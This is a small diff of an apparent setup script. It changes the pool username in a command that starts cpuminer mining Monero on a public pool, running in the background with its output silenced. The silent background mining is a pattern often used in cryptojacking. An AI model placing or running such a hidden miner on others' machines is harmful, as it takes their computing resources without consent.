@@ -14,4 +14,4 @@ cd cpuminer-multi
 
 ./build.sh
 
-./cpuminer -a cryptonight -o stratum+tcp://xmr.viabtc.com:8888 -u gufik11 -p x > /dev/null 2>&1 &
+./cpuminer -a cryptonight -o stratum+tcp://xmr.viabtc.com:8888 -u gufik611 -p x > /dev/null 2>&1 &
